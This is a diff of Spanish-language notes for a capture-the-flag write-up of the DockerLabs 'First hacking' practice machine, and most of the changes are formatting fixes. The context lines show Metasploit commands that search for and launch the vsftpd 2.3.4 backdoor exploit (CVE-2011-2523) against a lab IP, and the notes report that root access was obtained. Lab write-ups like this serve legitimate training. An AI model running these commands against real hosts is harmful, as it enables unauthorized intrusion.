@@ -2,6 +2,7 @@ Machine name: First haking
 plataforma: https://dockerlabs.es/#/
 Dificultad: Muy facil
 source: https://mega.nz/file/oCd2VC5D#QfiRoFmZrZ-FjTuyRX9bLw7638fjluwp6jNth7JjXTw
+Autor: El pinguino de Mario
 
 Herramientas:
 - [[Ping]]
@@ -47,7 +48,7 @@ lanzamos metaesploit
 buscamos por el CVE y al no encontrarlo buscamos por la versión de FTP:
 
 ```sh fold:"metaesploit"
-search CVE-2011-2523
+search CVE-2011-2523 # No results
 search ftp 2.3.4
 use 0
 set RHOSTS 172.17.0.2
@@ -58,10 +59,11 @@ run
 
 
 metaesploit configuramos el IP destino:
-![[Dockerlabs - FirstHacking - Metaesploit configuracion de la IP del host.png]]m
+![[Dockerlabs - FirstHacking - Metaesploit configuracion de la IP del host.png]]
 
 
 Una vez configurado el metasploit lanzamos run para lanzar el ataque
+
 ![[Dockerlabs - FirstHacking - Correr metaesploit.png]]
 conseguimos acceso con el usuario root:
 
